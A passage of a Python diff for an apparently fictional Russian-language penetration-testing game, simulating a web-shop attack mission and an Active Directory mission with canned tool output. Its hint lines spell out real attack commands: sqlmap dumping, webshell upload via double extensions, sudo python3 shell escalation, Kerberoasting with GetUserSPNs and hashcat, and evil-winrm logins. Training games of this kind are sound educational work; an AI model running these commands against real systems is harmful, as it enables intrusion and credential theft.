+            r.ok("  HTTP/1.1 200 OK  — Добро пожаловать в панель администратора!")
+            r.data("  [Users: 3482 | Orders: 18741 | Revenue: 2,847,290 RUB]")
+        elif "admin" in url:
+            r.warn("  HTTP/1.1 401 Unauthorized")
+            r.data("  WWW-Authenticate: Basic realm='ShopFast Admin'")
+            r.warn(f"  [!] Попробуй: curl -u admin:admin123 {TURL}/admin/")
+        elif "config.php.bak" in url:
+            r.ok("  HTTP/1.1 200 OK")
+            r.ok("  DB_HOST=localhost")
+            r.ok("  DB_USER=shopfast_admin")
+            r.ok("  DB_PASS=Sh0pF@st#2024!")
+            r.ok("  DB_NAME=shopfast_db")
+        else:
+            r.sys("  HTTP/1.1 200 OK")
+            r.data("  <!DOCTYPE html>")
+            r.data("  <title>ShopFast — Онлайн магазин</title>")
+            r.warn("  <!-- PHP/7.4.33 | Apache/2.4.52 -->")
+        gs.add_threat(0.01)
+        return r
+
+    # ── sqlmap ───────────────────────────────────────────────
+    if verb == "sqlmap":
+        if not args:
+            r.err("  Ошибка: не указан URL")
+            r.sys("  Использование: sqlmap -u <url> [--dbs] [--tables] [--dump] [--batch]")
+            r.sys(f'  Пример:  sqlmap -u "{TURL}/api/users.php?id=1" --dbs --batch')
+            return r
+        if "-u" not in rest and not any(a.startswith("http") for a in args):
+            r.err("  Ошибка: флаг -u обязателен")
+            r.sys(f'  Пример:  sqlmap -u "{TURL}/api/users.php?id=1" --dbs --batch')
+            return r
+        url = next((a for a in args if "http" in a), f"{TURL}/api/users.php?id=1")
+
+        r.info(f'  sqlmap -u "{url}" --batch')
+        r.sys( f"  [*] starting @ {time.strftime('%H:%M:%S')}")
+        r.sys(  "  [*] testing connection to target URL...")
+        r.data( "  [*] checking if the target is protected by IPS/WAF/FW...")
+        r.ok(  f"  [+] GET parameter 'id' — 'MySQL >= 5.1 AND error-based' injectable")
+        r.ok(   "  [+] GET parameter 'id' is vulnerable!")
+        r.ok(   "  [+] back-end DBMS: MySQL >= 8.0")
+        r.blank()
+        r.ok(   "  available databases [4]:")
+        r.data( "  [*] information_schema")
+        r.data( "  [*] mysql")
+        r.ok(   "  [*] shopfast_db  ← главная БД")
+        r.data( "  [*] performance_schema")
+        f["sqli_confirmed"] = True
+        gs.complete_obj("sqli")
+        gs.add_threat(0.12)
+
+        if "--tables" in rest or "--dump" in rest:
+            r.blank()
+            r.ok("  Tables in database 'shopfast_db' [5]:")
+            r.data("  [*] credit_cards")
+            r.data("  [*] orders")
+            r.data("  [*] products")
+            r.data("  [*] sessions")
+            r.data("  [*] users")
+
+        if "--dump" in rest:
+            r.blank()
+            r.ok("  Table: credit_cards (3482 entries)")
+            r.data("  id | card_number                  | cvv | exp_date | holder")
+            r.sys( "  ───┼──────────────────────────────┼─────┼──────────┼────────────────")
+            for i in range(1, 6):
+                n  = (f"4{random.randint(100,999)}-"
+                      f"{random.randint(1000,9999)}-"
+                      f"{random.randint(1000,9999)}-"
+                      f"{random.randint(1000,9999)}")
+                cv = random.randint(100, 999)
+                r.add(f"  {i:<3} {n}   {cv}   0{i}/2{random.randint(6,9)}    Client_{i}", "to")
+            r.ok( "  ...")
+            r.ok( "  [+] 3482 записей сохранено в dump.csv")
+            gs.complete_obj("dump")
+            f["db_dumped"] = True
+
+        if "--tables" not in rest and "--dump" not in rest:
+            r.warn(f'  [→] Дамп таблицы:  sqlmap -u "{url}" -D shopfast_db --tables --dump')
+        return r
+
+    # ── wfuzz ────────────────────────────────────────────────
+    if verb == "wfuzz":
+        if not args:
+            r.err("  Ошибка: нет аргументов")
+            r.sys("  Использование: wfuzz -c -z file,<wordlist> -u <url>/FUZZ")
+            r.sys(f"  Пример:  wfuzz -c -z file,common.txt -u {TURL}/FUZZ.php")
+            return r
+        r.info(f"  wfuzz {rest}")
+        r.sys( "  ════════════════════════════════════════")
+        hits = [
+            ("upload",  "200", "1205 W"),
+            ("config",  "403", "—     "),
+            ("install", "403", "—     "),
+            ("test",    "200", "892 W "),
+        ]
+        for name, code, size in hits:
+            col = "to" if code == "200" else "tw"
+            r.add(f"  {code}   C={code}   {size:>8}   {TURL}/{name}.php", col)
+        r.ok("  Finished. Total: 4614 req")
+        return r
+
+    # ── burp ─────────────────────────────────────────────────
+    if verb == "burp":
+        r.info("  Burp Suite Professional (headless) запускается...")
+        r.ok(  "  Proxy listener: 127.0.0.1:8080  [ON]")
+        r.ok(  "  Spider / Active Scanner: ready")
+        r.warn(f'  [→] curl -x 127.0.0.1:8080 "{TURL}/api/users.php?id=1\'"')
+        return r
+
+    # ── upload ───────────────────────────────────────────────
+    if verb == "upload":
+        if not args:
+            r.err("  Ошибка: не указан файл")
+            r.sys("  Использование: upload <имя_файла>")
+            r.sys("  Пример:  upload shell.php.jpg   (двойное расширение)")
+            r.sys("           upload shell.phtml")
+            return r
+        fname = args[0]
+        ext = fname.lower()
+        is_plain_php = ext.endswith(".php") and not any(
+            x in ext for x in (".php.", ".phtml", ".php5", ".php7")
+        )
+        is_bypass = any(x in ext for x in (".php.", "phtml", "php5", "php7"))
+
+        if is_plain_php:
+            r.err( "  HTTP/1.1 400 Bad Request")
+            r.err( "  Недопустимое расширение: .php")
+            r.sys( "  Сервер проверяет расширение — попробуй:")
+            r.warn("  • upload shell.php.jpg    (двойное расширение)")
+            r.warn("  • upload shell.phtml      (альтернативное расширение)")
+            r.warn("  • upload shell.php5       (PHP5)")
+        elif is_bypass:
+            r.sys( "  POST /upload.php HTTP/1.1")
+            r.sys( "  Content-Type: multipart/form-data; boundary=----boundary123")
+            r.blank()
+            r.ok(  "  HTTP/1.1 200 OK")
+            r.ok(  f"  Файл загружен: /uploads/{fname}")
+            r.ok(  "  [+] Сервер принял файл — MIME-тип не проверяется!")
+            f["shell_uploaded"] = True
+            f["shell_path"]     = f"/uploads/{fname}"
+            r.blank()
+            r.warn( "  [→] Активируй shell:  webshell id")
+            r.warn(f"       GET {TURL}/uploads/{fname}?cmd=id")
+        else:
+            r.ok(f"  HTTP/1.1 200 OK — Обычный файл загружен: /uploads/{fname}")
+        gs.add_threat(0.08)
+        return r
+
+    # ── webshell ─────────────────────────────────────────────
+    if verb == "webshell":
+        if not f.get("shell_uploaded"):
+            r.err("  Ошибка: shell не загружен на сервер")
+            r.sys("  Сначала загрузи shell:  upload shell.php.jpg")
+            return r
+        cmd  = rest if rest else "id"
+        path = f.get("shell_path", "/uploads/shell.php.jpg")
+        r.info(f"  GET {TURL}{path}?cmd={cmd}")
+        r.sys( "  HTTP/1.1 200 OK")
+        r.blank()
+        outputs = {
+            "id"             : "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+            "whoami"         : "www-data",
+            "hostname"       : "shopfast-prod-01",
+            "uname -a"       : "Linux shopfast-prod-01 5.15.0-88-generic #98-Ubuntu SMP x86_64 GNU/Linux",
+            "ls"             : "admin  api  config.php  index.php  login.php  upload.php  uploads",
+            "pwd"            : "/var/www/html",
+            "sudo -l"        : (
+                "Matching Defaults entries for www-data on shopfast-prod-01:\n"
+                "  env_reset, mail_badpass\n\n"
+                "Команды www-data может выполнять как (root):\n"
+                "  (ALL : ALL) NOPASSWD: /usr/bin/python3"
+            ),
+            "ls /home"       : "shopfast_admin  ubuntu",
+            "ls /root"       : "root.txt  .bash_history  backup/",
+            "cat /etc/passwd": "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33::/var/www:/usr/sbin/nologin",
+        }
+        out = outputs.get(cmd, f"[{cmd}: выполнено, exit code 0]")
+        for line in out.split("\n"):
+            r.ok(f"  {line}")
+        if not f.get("shell_active"):
+            f["shell_active"] = True
+            gs.complete_obj("shell")
+            r.blank()
+            r.ok("  [+] RCE подтверждён! Мы — www-data на сервере.")
+            r.warn("  [→] Проверь sudo: webshell sudo -l")
+            r.warn("  [→] Найди SUID:   webshell find / -perm -4000 -type f")
+        gs.add_threat(0.14)
+        return r
+
+    # ── nc ───────────────────────────────────────────────────
+    if verb == "nc":
+        if not args:
+            r.err("  Ошибка: не указан порт")
+            r.sys("  Использование: nc -lvnp <порт>")
+            r.sys("  Пример:  nc -lvnp 4444")
+            return r
+        port = next((a for a in args if a.isdigit()), "4444")
+        r.info(f"  nc -lvnp {port}")
+        r.ok(  "  Ncat: Version 7.93 ( https://nmap.org/ncat )")
+        r.ok(  f"  Listening on 0.0.0.0:{port}")
+        if f.get("shell_active"):
+            r.ok( f"  Ncat: Connection from {TIP}:58741.")
+            r.ok(  "  $ id")
+            r.ok(  "  uid=33(www-data) gid=33(www-data) groups=33(www-data)")
+            r.warn("  [→] Теперь работай интерактивно: sudo -l, cat /etc/passwd")
+        else:
+            r.warn("  [ожидание соединения] ... (нужен активный webshell)")
+        return r
+
+    # ── sudo ─────────────────────────────────────────────────
+    if verb == "sudo":
+        if not f.get("shell_active"):
+            r.err("  Ошибка: нет активного shell на целевом сервере")
+            r.sys("  Сначала получи RCE через: upload shell.php.jpg → webshell id")
+            return r
+        if not args or args[0] == "-l":
+            r.data("  Matching Defaults entries for www-data:")
+            r.data("    env_reset, mail_badpass, secure_path=...")
+            r.blank()
+            r.ok(  "  Команды www-data на shopfast-prod-01:")
+            r.ok(  "  (ALL : ALL) NOPASSWD: /usr/bin/python3")
+            r.blank()
+            r.warn("  [→] sudo python3 -c 'import os; os.execl(\"/bin/bash\",\"bash\")'")
+            return r
+        if "python3" in rest or "python" in rest:
+            if "exec" in rest or "pty" in rest or "os" in rest or "bash" in rest:
+                r.ok("  # id")
+                r.ok("  uid=0(root) gid=0(root) groups=0(root)")
+                r.ok("  # hostname")
+                r.ok("  shopfast-prod-01")
+                f["privesc_done"] = True
+                gs.complete_obj("privesc")
+                r.blank()
+                r.ok("  [+] ПРИВИЛЕГИИ ПОВЫШЕНЫ ДО ROOT!")
+                r.warn("  [→] Дамп БД:  mysql -u root shopfast_db")
+                r.warn(f'  [→] Или:  sqlmap -u "{TURL}/api/users.php?id=1" -D shopfast_db --dump')
+                gs.add_threat(0.10)
+            else:
+                r.data(f"  Python 3.12.0")
+                r.data(f"  >>> {rest.replace('python3', '').replace('python','').replace('-c','').strip()}")
+            return r
+        r.err(f"  sudo: {rest}: команда не разрешена для www-data")
+        r.warn("  [!] Разрешён только python3. Проверь: sudo -l")
+        return r
+
+    # ── ls / cat / find ───────────────────────────────────────
+    if verb == "ls":
+        if not f.get("shell_active"):
+            r.err("  Ошибка: нет shell. Используй: webshell ls [путь]")
+            return r
+        path = args[0] if args else "/var/www/html"
+        dirs = {
+            "/var/www/html": "admin/  api/  config.php  index.php  login.php  upload.php  uploads/",
+            "/var/www/html/uploads": (
+                f.get("shell_path", "shell.php.jpg").lstrip("/uploads/") or "(пусто)"
+            ),
+            "/home":  "shopfast_admin/  ubuntu/",
+            "/root":  "root.txt  backup/  .bash_history",
+            "/tmp":   "tmp_sess_abc123  .privesc/",
+        }
+        r.ok(f"  {dirs.get(path, 'ls: нет доступа или файла')}")
+        return r
+
+    if verb == "cat":
+        if not args:
+            r.err("  Ошибка: не указан файл")
+            r.sys("  Использование: cat <файл>")
+            return r
+        if not f.get("shell_active"):
+            r.err("  Ошибка: нет shell. Используй: webshell cat <файл>")
+            return r
+        fname = args[0]
+        files = {
+            "config.php"   : "DB_HOST=localhost\nDB_USER=shopfast_admin\nDB_PASS=Sh0pF@st#2024!\nDB_NAME=shopfast_db",
+            "/etc/passwd"  : "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33::/var/www:/usr/sbin/nologin\nshopfast_admin:x:1000:1000::/home/shopfast_admin:/bin/bash",
+            "/etc/shadow"  : "cat: /etc/shadow: Permission denied",
+            "root.txt"     : "GP{r00t_4cc3ss_acqu1red_shopf4st}",
+        }
+        content = files.get(fname, files.get(fname.split("/")[-1], f"cat: {fname}: No such file"))
+        for line in content.split("\n"):
+            r.ok(f"  {line}")
+        return r
+
+    if verb == "find":
+        if not f.get("shell_active"):
+            r.err("  Ошибка: нет shell. Используй: webshell find <путь> [опции]")
+            return r
+        if not args:
+            r.err("  Ошибка: не указан путь")
+            r.sys("  Использование: find <путь> [опции]")
+            r.sys("  Пример:  find / -perm -4000 -type f 2>/dev/null")
+            return r
+        if "-perm" in rest and "4000" in rest:
+            r.info("  Поиск SUID файлов...")
+            r.ok(  "  /usr/bin/python3.10")
+            r.data("  /usr/bin/passwd")
+            r.data("  /usr/bin/mount")
+            r.data("  /usr/bin/su")
+            r.ok(  "  [+] /usr/bin/python3.10 имеет SUID!")
+            r.warn("  [→] GTFOBins: python3 -c 'import os; os.execl(\"/bin/bash\",\"bash\")'")
+        elif "-name" in rest:
+            r.ok("  /var/www/html/config.php")
+            r.ok("  /var/www/html/includes/db.php")
+            r.ok("  /etc/apache2/apache2.conf")
+        else:
+            r.data(f"  find {rest}: поиск завершён")
+        return r
+
+    # ── mysql ────────────────────────────────────────────────
+    if verb in ("mysql", "mysql5", "mysql8"):
+        if not f.get("privesc_done"):
+            r.err("  ERROR 1045: Access denied for 'root'@'localhost' (using password: NO)")
+            r.warn("  [!] Нет root-доступа. Сначала: sudo python3 -c 'import os;...'")
+            return r
+        r.ok(  "  mysql> connection to localhost [OK]")
+        r.ok(  "  Welcome to the MySQL monitor.")
+        r.ok(  "  mysql> show databases;")
+        r.ok(  "  shopfast_db | mysql | information_schema | performance_schema")
+        r.ok(  "  mysql> use shopfast_db; show tables;")
+        r.ok(  "  credit_cards | orders | products | sessions | users")
+        r.ok(  "  mysql> select * from credit_cards limit 5;")
+        for i in range(1, 6):
+            n = (f"4{random.randint(100,999)}-"
+                 f"{random.randint(1000,9999)}-"
+                 f"{random.randint(1000,9999)}-"
+                 f"{random.randint(1000,9999)}")
+            r.ok(f"  {i}  |  {n}  |  {random.randint(100,999)}  |  0{i}/2{random.randint(6,9)}")
+        r.ok("  3482 rows in set (0.08 sec)")
+        r.ok("  [+] mysqldump -u root shopfast_db > /tmp/dump.sql")
+        gs.complete_obj("dump")
+        f["db_dumped"] = True
+        gs.add_threat(0.05)
+        return r
+
+    # ── python3 ──────────────────────────────────────────────
+    if verb == "python3":
+        if not args and not rest:
+            r.data("  Python 3.12.0 (main)")
+            r.data("  >>>")
+            return r
+        if ("os.execl" in rest or "pty.spawn" in rest) and f.get("shell_active"):
+            r.ok("  # id")
+            r.ok("  uid=0(root) gid=0(root) groups=0(root)")
+            f["privesc_done"] = True
+            gs.complete_obj("privesc")
+            r.ok("  [+] ROOT!")
+            return r
+        r.data(f"  >>> {rest}")
+        r.data("  (Python 3.12.0)")
+        return r
+
+    return _not_found(verb)
+
+
+# ═══════════════════════════════════════════════════════════════
+#  МИССИЯ 2 — ACTIVE DIRECTORY
+# ═══════════════════════════════════════════════════════════════
+AD_HOSTS = {
+    "10.10.10.1" : {"name":"gateway","os":"Cisco IOS","ports":["80","443"],"roles":["gw"]},
+    "10.10.10.10": {"name":"DC01",   "os":"Windows Server 2019","ports":["53","88","135","389","445","3268","5985"],"roles":["dc"]},
+    "10.10.10.20": {"name":"WEB01",  "os":"Windows Server 2016","ports":["80","443","5985"],"roles":["iis"]},
+    "10.10.10.30": {"name":"DB01",   "os":"Windows Server 2019","ports":["1433","5985"],"roles":["mssql"]},
+    "10.10.10.40": {"name":"FILE01", "os":"Windows Server 2016","ports":["139","445","5985"],"roles":["file"]},
+    "10.10.10.50": {"name":"WS01",   "os":"Windows 10 Pro","ports":["139","445"],"roles":["ws"]},
+}
+
+def _m2(verb, args, rest, gs: GameState, r: R) -> R:
+    f = gs.flags
+
+    # ── nmap ─────────────────────────────────────────────────
+    if verb == "nmap":
+        if not args:
+            r.err("  Ошибка: не указан хост или сеть")
+            r.sys("  Использование: nmap [опции] <host|CIDR>")
+            r.sys("  Пример:  nmap -sV -p- 10.10.10.0/24")
+            return r
+        host = next((a for a in args if not a.startswith("-")), None)
+        if not host:
+            r.err("  Ошибка: нет хоста/сети в аргументах")
+            r.sys("  Пример:  nmap -sV 10.10.10.0/24")
+            return r
+        r.info(f"  Starting Nmap 7.94 — Host discovery scan: {host}")
+        r.blank()
+        svc_map = {
+            "53": "domain", "88": "kerberos-sec", "135": "msrpc",
+            "139": "netbios-ssn", "389": "ldap", "445": "microsoft-ds",
+            "1433": "ms-sql-s", "3268": "globalcatLDAP",
+            "5985": "wsman (WinRM)", "80": "http", "443": "https",
+        }
+        for ip, h in AD_HOSTS.items():
+            r.ok(f"  Nmap scan report for {h['name']} ({ip})")
+            r.sys( "  Host is up (0.002s latency).")
+            if "-sV" in rest or "-A" in rest or "-p" in rest:
+                for p in h["ports"]:
+                    svc = svc_map.get(p, "unknown")
+                    col = "to" if p in ("445","88","389","1433","5985") else "td"
+                    r.add(f"  {p:<8}/tcp  open  {svc}", col)
+            else:
+                r.data(f"  Open ports: {', '.join(h['ports'])}")
+            r.sys("")
+            f["known_hosts"][ip] = {"name": h["name"], "state": "scanned"}
+        r.sys("  Nmap done: 6 IPs scanned in 28.41 seconds")
+        r.blank()
+        r.warn("  [→] DC01 (10.10.10.10) — контроллер домена MEGASTEEL.LOCAL")
+        r.warn("  [→] Следующий шаг:  enum4linux-ng -A 10.10.10.10")
+        gs.complete_obj("scan")
+        f["nmap_done"] = True
+        gs.add_threat(0.05)
+        return r
+
+    # ── ping ─────────────────────────────────────────────────
+    if verb == "ping":
+        if not args:
+            r.err("  Ошибка: не указан хост")
+            r.sys("  Использование: ping <host>")
+            return r
+        host = args[0]
+        r.info(f"  PING {host} (64 bytes)")
+        r.ok(  f"  64 bytes from {host}: icmp_seq=1 ttl=128 time=2.12 ms")
+        r.ok(  f"  64 bytes from {host}: icmp_seq=2 ttl=128 time=1.98 ms")
+        r.ok(  f"  64 bytes from {host}: icmp_seq=3 ttl=128 time=2.05 ms")
+        r.ok(   "  3 packets transmitted, 3 received, 0% packet loss")
+        return r
+
+    # ── enum4linux / enum4linux-ng ────────────────────────────
+    if verb in ("enum4linux", "enum4linux-ng"):
+        if not args:
+            r.err(f"  Ошибка: не указан IP")
+            r.sys(f"  Использование: {verb} -A <IP>")
+            r.sys( "  Пример:  enum4linux-ng -A 10.10.10.10")
+            return r
+        if "-A" not in rest and "-U" not in rest and "-S" not in rest:
+            r.warn( "  Предупреждение: рекомендуется флаг -A (полное перечисление)")
+            r.sys(f"  Пример:  {verb} -A 10.10.10.10")
+        ip = next((a for a in args if not a.startswith("-")), "10.10.10.10")
+        r.info(f"  {verb} -A {ip}")
+        r.sys( "  ═══════════════════════════════════════════════")
+        r.ok(  "  [*] WORKGROUP/DOMAIN: MEGASTEEL")
+        r.ok(  "  [*] Domain SID: S-1-5-21-2744704894-1548518579-3245474702")
+        r.blank()
+        r.ok(  "  [+] SMB Shares (anonymous):")
+        r.data("       ADMIN$     — закрыт")
+        r.data("       C$         — закрыт")
+        r.ok(  "       NETLOGON   — Logon server share")
+        r.ok(  "       SYSVOL     — Logon server share")
+        r.ok(  "       IT_Backups — Anonymous READ!  ← интересно!")
+        r.blank()
+        r.ok(  "  [+] Users (SAMRPC):")
+        users = [
+            ("Administrator",  "(RID 500)"),
+            ("svc_mssql",      "(RID 1103)  ← сервисный аккаунт"),
+            ("svc_backup",     "(RID 1104)  ← сервисный аккаунт"),
+            ("john.doe",       "(RID 1105)"),
+            ("sarah.it",       "(RID 1106)"),
+            ("helpdesk",       "(RID 1107)"),
+            ("krbtgt",         "(RID 502)"),
+        ]
+        for u, note in users:
+            col = "to" if "svc_" in u else "td"
+            r.add(f"       MEGASTEEL\\{u:<20} {note}", col)
+        r.blank()
+        r.ok(  "  [+] Groups:")
+        r.data("       Domain Admins:    Administrator")
+        r.ok(  "       Backup Operators: svc_backup  ← потенциальный DCSync!")
+        r.blank()
+        r.sys( "  ═══════════════════════════════════════════════")
+        gs.complete_obj("enum")
+        f["enum_done"] = True
+        gs.add_threat(0.06)
+        r.warn("  [→] IT_Backups доступна анонимно:")
+        r.warn("       smbclient //10.10.10.40/IT_Backups -N")
+        r.warn("  [→] svc_backup в Backup Operators — цель Kerberoasting")
+        return r
+
+    # ── smbclient / smbmap ────────────────────────────────────
+    if verb in ("smbclient", "smbmap"):
+        if not args:
+            r.err(f"  Ошибка: не указана шара")
+            r.sys(f"  Использование: {verb} //<IP>/<share> [-N | -U user%pass]")
+            r.sys( "  Пример:  smbclient //10.10.10.40/IT_Backups -N")
+            return r
+        share_arg = args[0]
+        if "IT_Backups" in share_arg or "it_backup" in share_arg.lower():
+            r.info(f"  {verb} {share_arg} -N")
+            r.ok(  '  Try "help" to get a list of possible commands.')
+            r.ok(  "  smb: \\> ls")
+            r.data("    .                                   D  0  Thu Nov  7 2024")
+            r.data("    ..                                  D  0  Thu Nov  7 2024")
+            r.ok(  "    credentials.txt                     A  156  Thu Nov  7 2024  ← !")
+            r.data("    backup_2024.zip                     A  1572831  Thu Nov  7 2024")
+            r.ok(  "  smb: \\> get credentials.txt")
+            r.ok(  "  getting file \\credentials.txt of size 156 as credentials.txt [OK]")
+            r.blank()
+            r.ok(  "  ═══ credentials.txt ════════════════════════════════")
+            r.data("  # Временные creds для MSSQL сервиса")
+            r.warn("  # ОБЯЗАТЕЛЬНО ИЗМЕНИТЬ ПОСЛЕ ДЕПЛОЯ!!!")
+            r.ok(  "  Service: MSSQL")
+            r.ok(  "  User:    MEGASTEEL\\svc_mssql")
+            r.ok(  "  Pass:    MegaSQL#2023!   (← не сменили после деплоя!)")
+            r.ok(  "  ════════════════════════════════════════════════════")
+            f["creds"] = "svc_mssql:MegaSQL#2023!"
+            r.blank()
+            r.ok(  "  [+] Credentials в открытом виде!")
+            r.warn("  [→] crackmapexec smb 10.10.10.0/24 -u svc_mssql -p 'MegaSQL#2023!'")
+        else:
+            r.info(f"  {verb} {share_arg}")
+            r.data("  Shares: ADMIN$ | C$ | NETLOGON | SYSVOL | IT_Backups")
+        gs.add_threat(0.04)
+        return r
+
+    # ── crackmapexec / netexec ────────────────────────────────
+    if verb in ("crackmapexec", "cme", "netexec", "nxc"):
+        if not args:
+            r.err(f"  Ошибка: не указан протокол и цель")
+            r.sys(f"  Использование: {verb} smb <target> [-u user -p pass]")
+            r.sys( "  Пример:  crackmapexec smb 10.10.10.0/24 -u svc_mssql -p 'MegaSQL#2023!'")
+            return r
+        proto = args[0] if args else "smb"
+        has_creds = "-u" in rest and "-p" in rest
+        valid_creds = has_creds and ("svc_mssql" in rest or "svc_backup" in rest)
+
+        if valid_creds:
+            r.info(f"  {verb} {proto} 10.10.10.0/24 -u svc_mssql -p 'MegaSQL#2023!'")
+            r.ok(  "  SMB  10.10.10.10  445  DC01    [*] Windows Server 2019 Build 17763 x64")
+            r.ok(  "  SMB  10.10.10.10  445  DC01    [+] MEGASTEEL\\svc_mssql:MegaSQL#2023! (Pwn3d!)")
+            r.ok(  "  SMB  10.10.10.20  445  WEB01   [+] MEGASTEEL\\svc_mssql:MegaSQL#2023!")
+            r.ok(  "  SMB  10.10.10.30  445  DB01    [+] MEGASTEEL\\svc_mssql:MegaSQL#2023! (Pwn3d!)")
+            r.ok(  "  SMB  10.10.10.40  445  FILE01  [+] MEGASTEEL\\svc_mssql:MegaSQL#2023!")
+            r.warn("  [→] DB01 и DC01 доступны! GetUserSPNs для Kerberoasting:")
+            r.warn("       GetUserSPNs.py MEGASTEEL.LOCAL/svc_mssql:'MegaSQL#2023!' -dc-ip 10.10.10.10 -request")
+        elif has_creds:
+            r.err(f"  SMB  10.10.10.10  445  DC01  [-] MEGASTEEL\\...: STATUS_LOGON_FAILURE")
+            r.warn("  [!] Неверные credentials. Ищи creds в SMB-шарах:")
+            r.warn("       smbclient //10.10.10.40/IT_Backups -N")
+        else:
+            r.info(f"  {verb} {proto} 10.10.10.0/24")
+            for ip, h in AD_HOSTS.items():
+                r.data(f"  SMB  {ip}  445  {h['name']:<10} [*] {h['os']}")
+        gs.add_threat(0.06)
+        return r
+
+    # ── kerbrute ─────────────────────────────────────────────
+    if verb == "kerbrute":
+        if not args:
+            r.err("  Ошибка: нет аргументов")
+            r.sys("  Использование: kerbrute userenum --dc <IP> -d <domain> <users_file>")
+            r.sys("  Пример:  kerbrute userenum --dc 10.10.10.10 -d MEGASTEEL.LOCAL users.txt")
+            return r
+        if "--dc" not in rest and "-d" not in rest:
+            r.err("  Ошибка: не указан --dc и/или -d")
+            r.sys("  Обязательно: kerbrute userenum --dc <IP> -d <domain> <file>")
+            return r
+        r.info(f"  kerbrute {rest}")
+        r.ok(  "  [+] VALID USERNAME: administrator@MEGASTEEL.LOCAL")
+        r.ok(  "  [+] VALID USERNAME: svc_mssql@MEGASTEEL.LOCAL")
+        r.ok(  "  [+] VALID USERNAME: john.doe@MEGASTEEL.LOCAL")
+        r.ok(  "  Done! 3 valid usernames found in 2.81 seconds")
+        gs.add_threat(0.04)
+        return r
+
+    # ── GetUserSPNs / Kerberoasting ───────────────────────────
+    if verb in ("getuserspns.py", "getuserspns", "impacket-getuserspns"):
+        if not args:
+            r.err("  Ошибка: не указаны аргументы")
+            r.sys("  Использование: GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <IP> -request")
+            r.sys("  Пример:  GetUserSPNs.py MEGASTEEL.LOCAL/svc_mssql:'MegaSQL#2023!' -dc-ip 10.10.10.10 -request")
+            return r
+        if not f.get("enum_done"):
+            r.warn("  [!] Сначала проведи перечисление домена:")
+            r.warn("       enum4linux-ng -A 10.10.10.10")
+            return r
+        if "-dc-ip" not in rest:
+            r.err("  Ошибка: не указан -dc-ip")
+            r.sys("  Пример:  GetUserSPNs.py MEGASTEEL.LOCAL/svc_mssql:'...' -dc-ip 10.10.10.10 -request")
+            return r
+        r.info(f"  GetUserSPNs.py {rest}")
+        r.ok(  "  Impacket v0.11.0 - Copyright 2023 Fortra")
+        r.blank()
+        r.ok(  "  ServicePrincipalName                   Name         MemberOf")
+        r.ok(  "  MSSQL/DB01.MEGASTEEL.LOCAL:1433        svc_mssql    ")
+        r.ok(  "  BACKUP/FILE01.MEGASTEEL.LOCAL          svc_backup   CN=Backup Operators")
+        r.blank()
+        r.ok(  "  [*] Getting TGS (Ticket Granting Service) for svc_backup...")
+        r.ok(  "  $krb5tgs$23$*svc_backup$MEGASTEEL.LOCAL$MEGASTEEL.LOCAL/svc_backup*")
+        r.ok(  "  $3a8f9e2d1b4c7f0e5a8d3c6b9e2f5a8d1c4b7e0f3a6c9d2e5b8f1a4c7d0e3b6...")
+        r.blank()
+        r.ok(  "  [+] TGS-хэш сохранён в: tgs_hash.txt")
+        f["kerberoast_done"] = True
+        f["hash_file"]       = "tgs_hash.txt"
+        gs.complete_obj("kerberoast")
+        gs.add_threat(0.10)
+        r.blank()
+        r.warn("  [→] Взломай хэш:")
+        r.warn("       hashcat -m 13100 tgs_hash.txt /usr/share/wordlists/rockyou.txt")
+        r.warn("       john tgs_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt")
+        return r
+
+    # ── hashcat / john ────────────────────────────────────────
+    if verb in ("hashcat", "john"):
+        if not args:
+            if verb == "hashcat":
+                r.err("  Ошибка: нет аргументов")
+                r.sys("  Использование: hashcat -m 13100 <hash_file> <wordlist>")
+                r.sys("  Пример:  hashcat -m 13100 tgs_hash.txt /usr/share/wordlists/rockyou.txt")
+            else:
+                r.err("  Ошибка: нет аргументов")
+                r.sys("  Использование: john <hash_file> --wordlist=<wordlist>")
+                r.sys("  Пример:  john tgs_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt")
+            return r
+        if verb == "hashcat" and "-m" not in rest:
+            r.err("  Ошибка: не указан тип хэша (-m)")
+            r.sys("  Для Kerberos TGS: hashcat -m 13100 <hash> <wordlist>")
+            return r
+        if not f.get("kerberoast_done"):
+            r.warn("  [!] Нет хэшей для взлома. Сначала выполни Kerberoasting:")
+            r.warn("       GetUserSPNs.py MEGASTEEL.LOCAL/svc_mssql:'MegaSQL#2023!' -dc-ip 10.10.10.10 -request")
+            return r
+        r.info(f"  {verb} {rest}")
+        r.sys( "  ══════════════════════════════════════════════════")
+        if verb == "hashcat":
+            r.sys("  hashcat (v6.2.6) starting...")
+        else:
+            r.sys("  John the Ripper 1.9.0-jumbo-1 (Linux)")
+        r.blank()
+        r.data("  Dictionary cache:")
+        r.data("  * /usr/share/wordlists/rockyou.txt  [14,344,391 passwords]")
+        r.blank()
+        r.ok(  "  $krb5tgs$23$*svc_backup...:Password@123")
+        r.blank()
+        r.ok(  "  Status.......: Cracked")
+        r.ok(  "  Hash.Mode....: 13100 (Kerberos 5, etype 23, TGS-REP)")
+        r.ok(  "  Time.Started.: 00:00:07")
+        r.ok(  "  Speed.#1.....: 2,847,192 H/s")
+        r.sys( "  ══════════════════════════════════════════════════")
+        f["cracked"] = True
+        f["creds"]   = "svc_backup:Password@123"
+        gs.complete_obj("crack")
+        gs.add_threat(0.03)
+        r.blank()
+        r.ok(  "  [+] ВЗЛОМАН: svc_backup : Password@123")
+        r.warn("  [→] svc_backup ∈ Backup Operators — DCSync возможен!")
+        r.warn("  [→] evil-winrm -i 10.10.10.10 -u svc_backup -p 'Password@123'")
+        return r
+
+    # ── evil-winrm ────────────────────────────────────────────
+    if verb in ("evil-winrm", "winrm"):
+        if not args:
+            r.err("  Ошибка: нет аргументов")
+            r.sys("  Использование: evil-winrm -i <IP> -u <user> -p <pass>")
+            r.sys("  Пример:  evil-winrm -i 10.10.10.10 -u svc_backup -p 'Password@123'")
+            return r
+        if "-i" not in rest:
+            r.err("  Ошибка: не указан IP (-i)")
+            r.sys("  Пример:  evil-winrm -i 10.10.10.10 -u svc_backup -p 'Password@123'")
+            return r
+        if "-u" not in rest or "-p" not in rest:
+            r.err("  Ошибка: не указаны -u (пользователь) и/или -p (пароль)")
+            r.sys("  Пример:  evil-winrm -i 10.10.10.10 -u svc_backup -p 'Password@123'")
+            return r
+        if not f.get("cracked") and not f.get("creds"):
